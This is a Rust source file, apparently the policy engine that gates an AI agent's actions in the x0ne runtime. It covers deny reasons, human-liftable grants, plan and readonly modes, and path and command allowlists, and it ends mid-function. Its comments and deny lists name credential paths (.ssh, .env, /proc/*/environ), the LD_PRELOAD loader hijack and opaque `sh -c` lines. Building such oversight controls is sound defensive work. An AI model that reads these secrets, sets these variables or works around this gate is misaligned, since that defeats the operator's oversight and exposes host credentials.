use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use crate::action::{Action, EventType};
// Side-effect semantics now live with the vocabulary they classify.
use crate::config::AppConfig;
pub use x0ne_actions::{is_destructive_action, is_network_action, SideEffectClass};

/// Outcome of a policy check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PolicyEffect {
    Allow,
    RequireConfirmation(String),
    Deny(DenyReason),
}

/// Which allowlist a path was measured against.
///
/// SECURITY: this field exists so that a refusal can name the ONE list that
/// would lift it. Before 2026-08-16 `PathNotInAllowlist` carried only the
/// path, and a session grant built from it would have had to guess between
/// `allowed_read_paths` and `allowed_write_paths` — guessing wrong means
/// either a grant that does not work (the operator says yes and is refused
/// again) or, far worse, a read refusal answered with a write permission.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PathAccess {
    Read,
    Write,
}

/// Why a policy check was denied.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum DenyReason {
    ActionDisabled,
    PathMatchesDenyPattern {
        path: String,
        pattern: String,
    },
    PathNotInAllowlist {
        path: String,
        access: PathAccess,
    },
    CommandNotAllowed {
        command: String,
    },
    DefaultDeny,
    // v0.2
    DesktopDisabled,
    EnvVarNotReadable {
        name: String,
    },
    NestingNotAllowed,
    PipelineStepDenied {
        step: usize,
        step_type: String,
        reason: Box<DenyReason>,
    },
    ImageNotAllowed {
        image: String,
    },
    ReadonlyMode,
    /// The action's `env` map sets a key `check_caller_env` refuses
    /// (LD_PRELOAD and kin). Caught at PREFLIGHT so the human gate never
    /// opens on it — before, preflight said allow, the operator said yes, and
    /// the executor refused after the yes.
    CallerEnvDenied {
        why: String,
    },
    /// An allowlisted interpreter was handed a script or inline code the gate
    /// cannot read (`bash script.sh`, `sh -c '$(…)'`). Fail closed: the real
    /// programs are invisible, so no allowlist entry vouches for them.
    CommandNotAnalyzable {
        command: String,
    },
    /// The human typed `/plan`: until `/build`, nothing that touches the host
    /// runs, whatever the policy file and the session grants say.
    PlanMode,
}

/// The directory a path grant should name.
///
/// A grant is a ROOT: `apply_grant` canonicalizes it and `is_within_roots`
/// then contains everything under it. Handing it a file therefore granted a
/// root of one file, under a prompt that said "directory (read)" —
/// `GrantKind::label` has said that word since the feature shipped, and the
/// field report of 2026-08-16 shows the value beside it being
/// `…/tickets/ticket-002.txt`. Owner's arbitration the same day: a read grant
/// covers the file's DIRECTORY, because that is what the label promises and
/// what an operator expects — he is answering a question about a place, not
/// buying one file at a time.
///
/// SECURITY: this widens what a single "yes" covers, deliberately and by one
/// level only. The directory still goes through `apply_grant`, so
/// `deny_path_patterns` is re-checked on it: granting a file inside `~/.ssh`
/// would have been refused there, and granting `~/.ssh` itself is refused by
/// the same line. A path that IS a directory is returned unchanged, and a path
/// with no usable parent falls back to itself rather than to `/`.
fn grantable_directory(path: &str) -> String {
    let p = std::path::Path::new(path);
    if p.is_dir() {
        return path.to_string();
    }
    match p.parent() {
        Some(parent) if !parent.as_os_str().is_empty() => parent.to_string_lossy().into_owned(),
        _ => path.to_string(),
    }
}

/// `command` and its `args` joined by spaces, for a refusal that names the
/// whole invocation when no single program token can.
fn join_argv(command: &str, args: &[String]) -> String {
    let mut s = command.to_string();
    for a in args {
        s.push(' ');
        s.push_str(a);
    }
    s
}

/// The env map(s) an action hands to a HOST child, run through
/// `check_caller_env` — `None` when the action carries none or all are
/// clean. Mirrors the executor's coverage exactly; widening it beyond what
/// the executor checks would refuse at preflight what execution allows.
fn caller_env_refusal(action: &Action) -> Option<String> {
    match action {
        Action::RunCommand { env, .. } => crate::child_env::check_caller_env(env).err(),
        Action::ArtifactServe { env, .. } => crate::child_env::check_caller_env(env).err(),
        _ => None,
    }
}

impl DenyReason {
    pub fn message(&self) -> String {
        match self {
            // Each refusal below names the lever that lifts it, and names it
            // the same way `AppConfig::policy_warnings` does at startup: the
            // TOML key, its section, and `x0ne --setup`. The field report of
            // 2026-08-15 is why — an operator told only "not in the
            // allowed_commands list" still has to go find where that list lives.
            DenyReason::ActionDisabled =>
                "This action type is disabled by configuration. Enable it under [actions] in x0ne-runtime.toml, answer 1 or 2 at the prompt, or run `x0ne --setup`.".into(),
            // A default holds even when the list omits it: its lever is
            // `deny_path_exceptions`, and removing it from the list does nothing.
            DenyReason::PathMatchesDenyPattern { path, pattern }
                if x0ne_actions::deny_paths::DEFAULT_DENY_PATH_PATTERNS.contains(&pattern.as_str()) =>
                format!("Path '{}' matches deny pattern '{}', a default that holds even when [policy] deny_path_patterns omits it. Name it in [policy] deny_path_exceptions in x0ne-runtime.toml if that is intended.", path, pattern),
            DenyReason::PathMatchesDenyPattern { path, pattern } =>
                format!("Path '{}' matches deny pattern '{}'. Remove the pattern from [policy] deny_path_patterns in x0ne-runtime.toml if that is intended.", path, pattern),
            DenyReason::PathNotInAllowlist { path, access } => {
                let list = match access {
                    PathAccess::Read => "allowed_read_paths",
                    PathAccess::Write => "allowed_write_paths",
                };
                format!("Path '{}' is not under any allowed path prefix. Add a parent directory to [policy] {} in x0ne-runtime.toml, answer 1 or 2 at the prompt, or run `x0ne --setup`. An empty list denies everything.", path, list)
            }
            // A line a shell would read (`cd x && cargo init`): allowlisting it
            // whole is never the fix. Plain lines are split before this point.
            DenyReason::CommandNotAllowed { command } if command.chars().any(char::is_whitespace) =>
                format!("RunCommand runs one program without a shell, and '{}' is a shell line. Put the program name alone in `command` and its arguments in `args`; split `&&`, pipes and redirections into separate RunCommands (Pipeline batches them).", command),
            DenyReason::CommandNotAllowed { command } =>
                format!("Command '{}' is not in the allowed_commands list. Add `\"{}\"` to [policy] allowed_commands in x0ne-runtime.toml, answer 1 or 2 at the prompt, or run `x0ne --setup`. An empty list denies every command.", command, command),
            DenyReason::DefaultDeny =>
                "Action denied by default policy (default_effect = \"deny\"). Change to \"allow\" or \"confirm\" in x0ne-runtime.toml.".into(),
            DenyReason::DesktopDisabled =>
                "Desktop actions are disabled. Set desktop.enabled = true in x0ne-runtime.toml.".into(),
            DenyReason::EnvVarNotReadable { name } =>
                format!("Environment variable '{}' is not in the readable_env_vars whitelist.", name),
            DenyReason::NestingNotAllowed =>
                "Pipeline nesting too deep (max depth 3). Flatten your pipeline.".into(),
            // The child's own message ends with "answer 1 or 2 at the prompt":
            // no prompt is offered for a composite (its refusal is not
            // liftable, see `liftable`), so the model is told what does
            // work. Journal 2026-08-17 11:35: a Pipeline of three MoveToTrash
            // was refused, no prompt appeared, and the model concluded the
            // policy forbade writes and stopped instead of retrying the step
            // alone.
            DenyReason::PipelineStepDenied { step, step_type, reason } =>
                format!(
                    "Pipeline rejected: step {} ({}) denied — {} A composite is not offered a grant: \
                     run that step on its own to be offered one.",
                    step, step_type, reason.message()
                ),
            DenyReason::ImageNotAllowed { image } =>
                format!("Container image '{}' is not in the allowed_images list.", image),
            DenyReason::ReadonlyMode =>
                "Write actions and commands are blocked in readonly mode. You can only read files and list directories.".into(),
            DenyReason::PlanMode =>
                "The session is in plan mode: the runtime refuses every write, command and other action that changes the host, whatever the policy and the session grants say. Read what you need, then answer with a plan. Only the user leaves plan mode, with /build.".into(),
            // `check_caller_env` already names the key and why it is
            // dangerous; relay its words. No lever is named because none
            // exists: the denylist is closed by design (`env_keys.rs`).
            DenyReason::CallerEnvDenied { why } => why.clone(),
            DenyReason::CommandNotAnalyzable { command } =>
                format!("'{}' hands an allowlisted interpreter a script or inline code the command gate cannot read, so the programs it runs face no allowlist. Put each program in its own RunCommand (Pipeline batches them), or pass a `-c` line of allowlisted commands separated by ;, && or |.", command),
        }
    }

    /// Can this refusal be put to the operator as a decision, and if so, what
    /// exactly would he be granting?
    ///
    /// SECURITY: this match is EXHAUSTIVE and has no `_ =>` arm, on purpose
    /// and for the same reason as the `SideEffectClass` match of invariant 3
    /// (`x0ne-actions/src/lib.rs`): the next `DenyReason` anyone adds must not
    /// be able to default into either answer. Defaulting to `Some` would offer
    /// a human the chance to waive a boundary nobody meant to be waivable;
    /// defaulting to `None` would quietly rebuild the wall this feature exists
    /// to remove. The compiler error IS the mechanism.
    ///
    /// `action_type` is passed in because `ActionDisabled` does not carry the
    /// name of the action it disabled — the engine knows it, the reason does
    /// not.
    ///
    /// The four liftable refusals all share one property: the operator can lift
    /// them today by editing one line of a file he already owns, and the
    /// refusal message already tells him which line. Everything else below is
    /// a posture, a boundary, or a structural limit — and the written reason
    /// is next to each arm, not in a doc-comment far away, so that changing an
    /// answer means overwriting the argument for it.
    pub fn liftable(
        &self,
        action_type: &str,
    ) -> Option<x0ne_actions::policy_grant::LiftableDenial> {
        use x0ne_actions::policy_grant::{GrantKind, LiftableDenial};
        match self {
            // ── Liftable: one line of one list ────────────────────────────
            DenyReason::CommandNotAllowed { command } => {
                Some(LiftableDenial::new(GrantKind::Command, command.clone()))
            }
            DenyReason::PathNotInAllowlist { path, access } => Some(LiftableDenial::new(
                match access {
                    PathAccess::Read => GrantKind::ReadPath,
                    PathAccess::Write => GrantKind::WritePath,
                },
                grantable_directory(path),
            )),
            DenyReason::ActionDisabled => Some(LiftableDenial::new(GrantKind::Action, action_type)),

            // ── Not liftable ──────────────────────────────────────────────
            //
            // The hard boundary. `deny_path_patterns` defaults to `.ssh`,
            // `.env`, `/proc/*/environ` and their kin: the material an
            // attacker needs to stop being an attacker on this host. It is the
            // one list in the whole policy that is written to be unconditional,
            // and a prompt that can waive it is not a boundary, it is a
            // formality. The operator lifts this with an editor, awake, with
            // the file in front of him.
            DenyReason::PathMatchesDenyPattern { .. } => None,

            // `mode = "readonly"` and `default_effect = "deny"` are postures,
            // not lists. The operator wrote a sentence about the whole runtime
            // ("this one does not change anything", "nothing runs unless I
            // named it"), and lifting a posture one action at a time from a
            // prompt is how a posture stops meaning anything. Note the
            // asymmetry that is deliberate: with `default_effect = "deny"` the
            // refusal an operator meets most often is `ActionDisabled`, which
            // IS offered — naming an action in `[actions]` is exactly the
            // gesture that posture asks of him. `DefaultDeny` fires only when
            // the action is absent from the map entirely, which on any config
            // this runtime writes means an action nobody has ever considered.
            DenyReason::ReadonlyMode => None,
            DenyReason::DefaultDeny => None,
            // Plan mode is a posture the human chose for this session; its
            // way out is `/build`, typed by him, never a grant.
            DenyReason::PlanMode => None,

            // `[desktop] enabled` is a master switch over screen capture and
            // synthetic input — a whole subsystem, not one command or one
            // directory. It is also a SECOND switch sitting above `[actions]`,
            // and offering the wrong one of the two is precisely the shape of
            // the enclave-write and wizard-profiles defects. `x0ne setup` turns the subsystem on.
            DenyReason::DesktopDisabled => None,

            // `readable_env_vars` guards secret material, like
            // `deny_path_patterns`. An environment variable is not a file the
            // operator can glance at before saying yes; its whole point is
            // that its value is not on screen.
            DenyReason::EnvVarNotReadable { .. } => None,

            // Structural limits with no config lever behind them: there is
            // nothing to grant. Offering a choice whose "yes" changes nothing
            // is the dead scaffold in prompt form.
            DenyReason::NestingNotAllowed => None,
            DenyReason::ImageNotAllowed { .. } => None,

            // Invariant 4: a composite is worth what it contains. The step
            // that was refused is not on screen — the operator would be
            // approving a widening he cannot read, which invariant 5 forbids.
            // The child refusal reappears, on its own and legible, the moment
            // the step is attempted by itself.
            DenyReason::PipelineStepDenied { .. } => None,

            // The loader-hijack denylist (`env_keys.rs`) is closed: there is
            // no TOML key behind it, so there is nothing a "yes" could
            // grant. Same reasoning as `EnvVarNotReadable`.
            DenyReason::CallerEnvDenied { .. } => None,

            // Not liftable: an opaque script's programs are not on screen to
            // approve. The way past is `--allow-all-commands` in a container.
            DenyReason::CommandNotAnalyzable { .. } => None,
        }
    }
}

/// Everything the operator widened at a prompt during THIS process's life.
///
/// SECURITY: in memory only, never written anywhere by the runtime, and gone
/// when the process exits. That is the whole contract of choice 1 at the
/// prompt, and it is what makes `--resume` inherit nothing: a resumed session
/// runs against a freshly spawned runtime whose `SessionGrants` is empty.
/// Persistence, when the operator asks for it, is the ORCHESTRATOR writing his
/// `x0ne-runtime.toml`; the two are deliberately different mechanisms so that
/// a grant can never quietly become permanent.
#[derive(Debug, Default, Clone)]
pub struct SessionGrants {
    commands: Vec<String>,
    read_roots: Vec<std::path::PathBuf>,
    write_roots: Vec<std::path::PathBuf>,
    actions: Vec<String>,
}

impl SessionGrants {
    pub fn is_empty(&self) -> bool {
        self.commands.is_empty()
            && self.read_roots.is_empty()
            && self.write_roots.is_empty()
            && self.actions.is_empty()
    }

    pub fn len(&self) -> usize {
        self.commands.len() + self.read_roots.len() + self.write_roots.len() + self.actions.len()
    }
}

/// Central policy engine.
#[derive(Clone)]
pub struct PolicyEngine {
    config: AppConfig,
    action_enabled: HashMap<String, bool>,
    deny_patterns: x0ne_actions::deny_paths::DenyList,
    /// Canonicalized read roots. EMPTY MEANS DENY ALL.
    read_roots: Vec<std::path::PathBuf>,
    /// Canonicalized write roots. EMPTY MEANS DENY ALL.
    write_roots: Vec<std::path::PathBuf>,
    /// What the operator widened at a prompt, this process only.
    ///
    /// Shared behind an `Arc` because `PolicyEngine` is `Clone` and the clone
    /// held by `ServerState` must see a grant applied through any other. A
    /// `RwLock` and not a `Mutex` because `evaluate` reads it on every action
    /// and writes happen once per human keystroke.
    grants: std::sync::Arc<std::sync::RwLock<SessionGrants>>,
    /// SECURITY: whether this runtime accepts `PolicyGrant` at all.
    ///
    /// True only in `runtime.mode = "stdio"`. See `crate::control` for the
    /// argument; the short form is that in stdio the writer of our stdin is
    /// the process that spawned us, and in `http`/`mcp` it is anyone who can
    /// reach a socket. Enforced twice — here, and by the fact that only the
    /// stdio read loop ever parses a control line — because a single
    /// enforcement point that later gets refactored around is this
    /// repository's most repeated defect.
    accepts_grants: bool,
    /// Plan mode, set by the human through a `SessionMode` control line.
    /// Shared like `grants`, so every clone (WatchAndReact holds one) sees it.
    plan: std::sync::Arc<std::sync::atomic::AtomicBool>,
}

/// Meta actions that are ALWAYS allowed regardless of the action map.
///
/// SECURITY: this list exempts from the ENTIRE gate — per-action switch,
/// `readonly`/`confirm` modes, path checks. Only what has strictly no
/// capability may enter it. `CallFunction` was removed on 2026-08-15, before
/// the asm-ai capability tier arrived: the exemption was safe as long as Rhai
/// was the only engine (no IO, no clock), and asm-ai is designed to break that
/// premise. Migration note in `docs/MIGRATION_GUARDRAILS.md` § 6.
///
/// SECURITY: `SendInput` was removed on 2026-08-16. It wrote to the stdin of a
/// live process (`executor/interactive.rs:14`) and the criterion above was
/// nonetheless supposed to exclude it: nobody checked. It is
/// `every_always_allow_entry_has_no_capability` that checks it now, and it
/// requires a written justification per entry — the class alone would have
/// seen nothing, since `SendInput` was classified `Meta`.
const ALWAYS_ALLOW: &[&str] = &[
    "PolicyCheck",
    "Simulate",
    "CheckHandle",
    "ListHandles",
    "ListCustomPrimitives",
    "ListFunctions",
];

/// Is this action exempted from the entire gate by `ALWAYS_ALLOW`?
///
/// SECURITY: the only public reader of the list, and `evaluate_with_config`
/// goes through it — a tool that wants to *show* the exemption (`x0ne config
/// inspect`) therefore cannot end up with its own copy of the list.
/// Came from a gap of this kind: `[actions] SendInput = false` was
/// written, loaded, and without effect because a second authority decided
/// before it. An operator can only see that gap if the tool displaying it
/// reads the real list.
pub fn is_always_allowed(type_name: &str) -> bool {
    ALWAYS_ALLOW.contains(&type_name)
}

impl PolicyEngine {
    pub fn new(config: AppConfig, action_enabled: HashMap<String, bool>) -> Self {
        let deny_patterns =
            x0ne_actions::deny_paths::DenyList::new(&config.policy.deny_path_patterns);

        // Roots are expanded (`~`) and canonicalized by the SAME helper the
        // executor uses, so the gate and the enforcement point cannot disagree.
        // An empty list means DENY ALL — see `executor::confine`.
        let read_roots =
            crate::executor::confine::normalize_roots(&config.policy.allowed_read_paths);
        let write_roots =
            crate::executor::confine::normalize_roots(&config.policy.allowed_write_paths);

        // SECURITY: stdio only. Any other mode — including a typo in
        // `runtime.mode`, which `main.rs` degrades to stdio — must not widen
        // the door, so this reads the string that was actually configured
        // rather than "whatever is not http or mcp".
        let accepts_grants = config.runtime.mode == "stdio";

        Self {
            read_roots,
            write_roots,
            config,
            action_enabled,
            deny_patterns,
            grants: std::sync::Arc::new(std::sync::RwLock::new(SessionGrants::default())),
            accepts_grants,
            plan: std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false)),
        }
    }

    /// Is the session in plan mode?
    pub fn plan_mode(&self) -> bool {
        self.plan.load(std::sync::atomic::Ordering::SeqCst)
    }

    /// Enter (`true`) or leave plan mode.
    ///
    /// SECURITY: stdio only, like `apply_grant`: leaving plan mode widens the
    /// policy, and only the process that spawned us speaks for the human.
    pub fn set_plan_mode(&self, on: bool) -> Result<(), String> {
        if !self.accepts_grants {
            return Err(format!(
                "this runtime is in mode '{}'; plan mode is switched over stdio only",
                self.config.runtime.mode
            ));
        }
        self.plan.store(on, std::sync::atomic::Ordering::SeqCst);
        Ok(())
    }

    /// Does this runtime accept policy grants at all?
    pub fn accepts_grants(&self) -> bool {
        self.accepts_grants
    }

    /// How many grants are live in this process. For the control response and
    /// for tests; never consulted by `evaluate`.
    pub fn granted_count(&self) -> usize {
        self.grants.read().map(|g| g.len()).unwrap_or(0)
    }

    /// Widen this running runtime's policy by one entry.
    ///
    /// SECURITY: every refusal below is a refusal the runtime makes even
    /// though it was ASKED to grant. The orchestrator is trusted to hold the
    /// human gate; it is not trusted to have asked the right question. In
    /// particular a grant can never lift `deny_path_patterns`
    /// (`a_grant_cannot_lift_a_deny_pattern`) — otherwise "allow this
    /// directory for the session" would be a one-keystroke path to `~/.ssh`.
    pub fn apply_grant(
        &self,
        grant: &x0ne_actions::policy_grant::PolicyGrant,
    ) -> Result<(), String> {
        use x0ne_actions::policy_grant::{validate_command_grant, GrantKind};

        if !self.accepts_grants {
            return Err(format!(
                "this runtime is in mode '{}'; policy grants are accepted over stdio only",
                self.config.runtime.mode
            ));
        }

        match grant.kind {
            GrantKind::Command => {
                validate_command_grant(&grant.value).map_err(|e| e.message())?;
                let mut g = self.grants.write().map_err(|_| "grant lock poisoned")?;
                if !g.commands.contains(&grant.value) {
                    g.commands.push(grant.value.clone());
                }
            }
            GrantKind::ReadPath | GrantKind::WritePath => {
                // A granted directory is canonicalized by the SAME helper that
                // normalizes a configured root, so a grant and a hand-written
                // line in `allowed_read_paths` are indistinguishable
                // afterwards. A path that does not resolve is dropped by
                // `normalize_roots` — which would silently grant nothing, so
                // it is an error here rather than a lie.
                let roots =
                    crate::executor::confine::normalize_roots(std::slice::from_ref(&grant.value));
                let Some(root) = roots.into_iter().next() else {
                    return Err(format!(
                        "'{}' does not resolve to an existing directory, so granting it would \
                         widen nothing",
                        grant.value
                    ));
                };
                // SECURITY: the hard boundary, re-checked at the point of the
                // grant and not merely at the point of the refusal. The
                // refusal that produced this grant said `CommandNotAllowed` or
                // `PathNotInAllowlist`; nothing stops a caller from asking for
                // a different path than the one that was refused.
                let as_str = root.to_string_lossy().to_string();
                if let Some(pattern) = self.matches_deny_pattern(&as_str) {
                    return Err(format!(
                        "'{as_str}' matches deny pattern '{pattern}'. A deny pattern is not \
                         something a prompt can waive; edit [policy] deny_path_patterns, or \
                         deny_path_exceptions for a default one."
                    ));
                }
                let mut g = self.grants.write().map_err(|_| "grant lock poisoned")?;
                let list = if grant.kind == GrantKind::ReadPath {
                    &mut g.read_roots
                } else {
                    &mut g.write_roots
                };
                if !list.contains(&root) {
                    list.push(root);
                }
            }
            GrantKind::Action => {
                // An action name this build does not know would sit in the map
                // forever, enabling nothing — dead scaffolding by construction.
                if !x0ne_actions::all_type_names().contains(&grant.value.as_str()) {
                    return Err(
                        x0ne_actions::policy_grant::GrantValueError::UnknownAction.message()
                    );
                }
                let mut g = self.grants.write().map_err(|_| "grant lock poisoned")?;
                if !g.actions.contains(&grant.value) {
                    g.actions.push(grant.value.clone());
                }
            }
        }
        Ok(())
    }

    /// The policy the EXECUTOR must enforce: the operator's file widened by
    /// the roots he granted at a prompt during this process's life.
    ///
    /// BUG (field report 2026-08-16, session `2026-08-16_15-17_6b1c`): the
    /// gate consulted the grants and the executor did not. `evaluate` called
    /// `path_granted` and answered Allow; `fs::read_file` then called
    /// `confine::resolve_read(path, &config.policy)` on the config as loaded
    /// from disk, saw no matching root, and refused. The journal shows the
    /// two 0.1 ms apart: a `policy_grant` for the directory, then
    /// `policy_denied` for the same file. A refusal AFTER a yes — the shape
    /// invariant 2 of docs/invariants.md exists to prevent, arriving here by the other
    /// door.
    ///
    /// SECURITY: this only ever ADDS roots the engine already validated in
    /// `apply_grant` — canonicalized by `normalize_roots`, checked against
    /// `deny_path_patterns`, and accepted only in `stdio` mode. It cannot
    /// remove a root, cannot touch the deny patterns, and returns `None` when
    /// nothing was granted, so the ordinary path hands the executor the
    /// operator's own config unmodified.
    pub fn config_with_session_grants(&self, base: &AppConfig) -> Option<AppConfig> {
        let g = self.grants.read().ok()?;
        if g.read_roots.is_empty() && g.write_roots.is_empty() {
            return None;
        }
        let mut cfg = base.clone();
        for (granted, list) in [
            (&g.read_roots, &mut cfg.policy.allowed_read_paths),
            (&g.write_roots, &mut cfg.policy.allowed_write_paths),
        ] {
            for root in granted {
                let as_str = root.to_string_lossy().to_string();
                if !list.contains(&as_str) {
                    list.push(as_str);
                }
            }
        }
        Some(cfg)
    }

    /// Was this command granted at a prompt during this process's life?
    fn command_granted(&self, command: &str) -> bool {
        self.grants
            .read()
            .map(|g| g.commands.iter().any(|c| c == command))
            .unwrap_or(false)
    }

    /// Was this action enabled at a prompt during this process's life?
    fn action_granted(&self, type_name: &str) -> bool {
        self.grants
            .read()
            .map(|g| g.actions.iter().any(|a| a == type_name))
            .unwrap_or(false)
    }

    /// Is this path inside a root granted at a prompt during this process's
    /// life? Containment is the SAME test as for a configured root, so a
    /// granted root confines exactly like a written one.
    fn path_granted(&self, candidate: &std::path::Path, access: PathAccess) -> bool {
        self.grants
            .read()
            .map(|g| {
                let roots = match access {
                    PathAccess::Read => &g.read_roots,
                    PathAccess::Write => &g.write_roots,
                };
                crate::executor::confine::is_within_roots(candidate, roots)
            })
            .unwrap_or(false)
    }

    /// Evaluate an action against all policy rules.
    pub fn evaluate(&self, action: &Action) -> PolicyEffect {
        self.evaluate_with_config(action, &self.config)
    }

    /// Evaluate an action against all policy rules, using a specific config.
    /// This two-arg form is used by WatchAndReact (which holds a cloned config).
    pub fn evaluate_with_config(&self, action: &Action, _config: &AppConfig) -> PolicyEffect {
        let type_name = action.type_name();

        // ── Meta actions are always allowed ──────────────────────────────────
        if is_always_allowed(type_name) {
            return PolicyEffect::Allow;
        }

        // ── Caller env: the same function the executor runs ──────────────────
        // SECURITY: `check_caller_env` used to run only at execution
        // (process.rs:44/:506/:722, artifact.rs:299) — preflight said allow,
        // the gate opened, the operator said yes, then the refusal fell.
        // Policy and executor now call the SAME function (the shared-function pattern),
        // on exactly the actions whose executor checks the map: RunCommand
        // and ArtifactServe. Container/sandbox env is NOT here on purpose —
        // it lands inside the container (`--env=`), another trust domain,
        // and the executor deliberately leaves it unchecked on the host.
        if let Some(why) = caller_env_refusal(action) {
            return PolicyEffect::Deny(DenyReason::CallerEnvDenied { why });
        }

        // ── Desktop: global gate ──────────────────────────────────────────────
        if self.is_desktop_action(action) && !self.config.desktop.enabled {
            return PolicyEffect::Deny(DenyReason::DesktopDisabled);
        }

        // ── Mode: Readonly & Confirm ──────────────────────────────────────────
        // Applied before action_enabled: system-wide policy overrides per-action config.
        //
        // SECURITY: derived from the side-effect class, NOT from a list. Until
        // 2026-09-11 this was `is_write_action || is_run_command ||
        // is_desktop_action` — three hand-written `matches!` the compiler
        // never checked against the vocabulary — and eleven actions that touch
        // the host were outside all three: `DeleteSnapshot`, `StopHandle`,
        // `Remember`, `Forget`, the four `*Function`/`*Primitive` writers,
        // `CreateSnapshot`, `CloudCost`, `GpuStatus`; and no `Network` action
        // at all, `SshExec` included. A runtime declared `readonly` ran them;
        // the shipped "Zero write permissions" MCP profile let a client write
        // into `~/.x0ne/functions/`. `Listen` the day before was the first
        // symptom found of this cause, not an isolated omission.
        //
        // `touches_host` is the same predicate the orchestrator's human gate
        // uses, so the two ends of the bridge now agree on what "modifying"
        // means. Composites are false here because their children are each
        // evaluated below (steps 2–2d) and answer for themselves. The test
        // `readonly_refuses_exactly_the_actions_whose_class_touches_the_host`
        // walks every variant of the vocabulary to hold this line.
        let is_modifying = action.side_effect_class().touches_host();
        // Plan mode first, and above the grants: a "for the session" yes given
        // before `/plan` must not open a write during it.
        if is_modifying && self.plan_mode() {
            return PolicyEffect::Deny(DenyReason::PlanMode);
        }
        if is_modifying && self.config.policy.mode == "readonly" {
            return PolicyEffect::Deny(DenyReason::ReadonlyMode);
        }
        if is_modifying && self.config.policy.mode == "confirm" {
            // Require human confirmation for modifying actions
            return PolicyEffect::RequireConfirmation(format!(
                "{} requires confirmation",
                type_name
            ));
        }

        // ── 1. Per-action enable switch ───────────────────────────────────────
        if let Some(&enabled) = self.action_enabled.get(type_name) {
            // A session grant flips this ONE switch, and only this one. Every
            // check above it — the desktop master switch, `readonly`,
            // `confirm` — has already run and cannot be reached from here.
            if !enabled && !self.action_granted(type_name) {
                return PolicyEffect::Deny(DenyReason::ActionDisabled);
            }
        } else if self.config.policy.default_effect == "deny" {
            // Deliberately NOT widened by a grant: `DefaultDeny` is not a
            // liftable refusal (see `DenyReason::liftable`), so no prompt can
            // produce a grant that would land here. Adding `|| granted` would
            // be a branch nothing can reach — a dead scaffold with a security
            // meaning.
            return PolicyEffect::Deny(DenyReason::DefaultDeny);
        }

        // ── 2. Pipeline: preflight all steps ─────────────────────────────────
        if let Action::Pipeline { steps, .. } = action {
            for (i, step) in steps.iter().enumerate() {
                match self.evaluate(step) {
                    PolicyEffect::Allow => {}
                    PolicyEffect::RequireConfirmation(msg) => {
                        return PolicyEffect::RequireConfirmation(format!(
                            "Pipeline step {} ({}) requires confirmation: {}",
                            i,
                            step.type_name(),
                            msg
                        ));
                    }
                    PolicyEffect::Deny(reason) => {
                        return PolicyEffect::Deny(DenyReason::PipelineStepDenied {
                            step: i,
                            step_type: step.type_name().to_string(),
                            reason: Box::new(reason),
                        });
                    }
                }
            }
            return PolicyEffect::Allow;
        }

        // ── 2b. Try: preflight all steps (like Pipeline) ─────────────────
        if let Action::Try { actions, .. } = action {
            for (i, step) in actions.iter().enumerate() {
                match self.evaluate(step) {
                    PolicyEffect::Allow => {}
                    PolicyEffect::RequireConfirmation(msg) => {
                        return PolicyEffect::RequireConfirmation(format!(
                            "Try step {} ({}) requires confirmation: {}",
                            i,
                            step.type_name(),
                            msg
                        ));
                    }
                    PolicyEffect::Deny(reason) => {
                        return PolicyEffect::Deny(DenyReason::PipelineStepDenied {
                            step: i,
                            step_type: step.type_name().to_string(),
                            reason: Box::new(reason),
                        });
                    }
                }
            }
            return PolicyEffect::Allow;
        }

        // ── 2c. SafeChange: preflight change and verification steps ─────
        if let Action::SafeChange { steps, tests, .. } = action {
            for (i, step) in steps.iter().chain(tests.iter()).enumerate() {
                match self.evaluate(step) {
                    PolicyEffect::Allow => {}
                    PolicyEffect::RequireConfirmation(msg) => {
                        return PolicyEffect::RequireConfirmation(format!(
                            "SafeChange step {} ({}) requires confirmation: {}",
                            i,
                            step.type_name(),
                            msg
                        ));
                    }
                    PolicyEffect::Deny(reason) => {
                        return PolicyEffect::Deny(DenyReason::PipelineStepDenied {
                            step: i,
                            step_type: step.type_name().to_string(),
                            reason: Box::new(reason),
                        });
                    }
                }
            }
            return PolicyEffect::Allow;
        }

        // ── 2d. If: preflight BOTH branches (like Pipeline) ─────────────
        // We reject the whole If if either the `then` or the `else`
        // branch contains a denied action. This matches Pipeline/Try's
        // "no surprises" contract: an If that evaluates to Allow can be
        // executed end-to-end without further policy decisions.
        if let Action::If {
            then, else_branch, ..
        } = action
        {
            for (label, branch) in [("then", then.as_slice()), ("else", else_branch.as_slice())] {
                for (i, step) in branch.iter().enumerate() {
                    match self.evaluate(step) {
                        PolicyEffect::Allow => {}
                        PolicyEffect::RequireConfirmation(msg) => {
                            return PolicyEffect::RequireConfirmation(format!(
                                "If {} branch step {} ({}) requires confirmation: {}",
                                label,
                                i,
                                step.type_name(),
                                msg
                            ));
                        }
                        PolicyEffect::Deny(reason) => {
                            return PolicyEffect::Deny(DenyReason::PipelineStepDenied {
                                step: i,
                                step_type: format!("{}:{}", label, step.type_name()),
                                reason: Box::new(reason),
                            });
                        }
                    }
                }
            }
            return PolicyEffect::Allow;
        }

        // ── 3–4. Path-level checks ────────────────────────────────────────────
        for path in self.paths_of(action) {
            // A read faces `read_refusal`, the function the SearchCode and
            // SearchAndRead walkers call on every file they would open.
            if self.is_read_action(action) {
                if let Some(reason) = self.read_refusal(&path) {
                    return PolicyEffect::Deny(reason);
                }
            } else if let Some(pattern) = self.matches_deny_pattern(&path) {
                return PolicyEffect::Deny(DenyReason::PathMatchesDenyPattern { path, pattern });
            }
            let candidate = std::path::Path::new(&path);
            if self.is_write_action(action)
                && !crate::executor::confine::is_within_roots(candidate, &self.write_roots)
                && !self.path_granted(candidate, PathAccess::Write)
            {
                return PolicyEffect::Deny(DenyReason::PathNotInAllowlist {
                    path,
                    access: PathAccess::Write,
                });
            }
        }

        // ── 5. Command allowlist ──────────────────────────────────────────────
        // Every exec path is gated, not only RunCommand (RunInSandbox sidestepped that).
        // SECURITY: a RunCommand/Listen shell or `env` is gated on each program it
        // launches; an unreadable line fails closed. `--allow-all-commands` is unchanged.
        match self.programs_to_authorize(action) {
            Err(reason) => return PolicyEffect::Deny(reason),
            Ok(programs) => {
                for command in programs {
                    if let Some(denied) = self.check_command_allowed(&command) {
                        return PolicyEffect::Deny(denied);
                    }
                }
            }
        }

        // ── 5b. Image allowlist for RunInSandbox (Podman) ────────────────────
        if let Action::RunInSandbox { image, .. } = action {
